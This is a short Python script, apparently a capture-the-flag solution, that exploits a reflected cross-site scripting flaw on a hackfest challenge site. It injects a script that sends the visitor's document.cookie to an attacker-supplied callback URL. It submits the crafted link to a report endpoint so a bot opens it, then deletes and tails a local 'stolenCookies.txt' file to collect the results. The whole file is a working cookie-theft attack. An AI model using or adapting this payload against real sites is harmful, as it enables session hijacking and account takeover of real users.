import sys
import os
import requests
import urllib.parse as urlEncode
import re

# Stolen cookies will be written to this file
file = '/var/www/html/callback/stolenCookies.txt'

url = 'http://hackfest.redrocket.club:31343/report'
xss = f'<script>new Image().src="{sys.argv[1]}?" + document.cookie;</script>'
payload = 'http://hackfest.redrocket.club:31343/?msg=' + urlEncode.quote(xss)
data = {'url':payload}

# Shows the generated link
#print(f'buggy link: {payload}')

# Sents
req = requests.session()
res = req.post(url, data=data)

if (res.status_code == 200):
    print("Waiting for request...\n\t")
    if os.path.isfile(file):
        os.system(f'sudo rm {file}')
        req.get(f'{sys.argv[1]}')
    else:
        req.get(f'{sys.argv[1]}')
    os.system(f'tail -f {file}')
else:
    print(f"ERROR {res.status_code}\n")
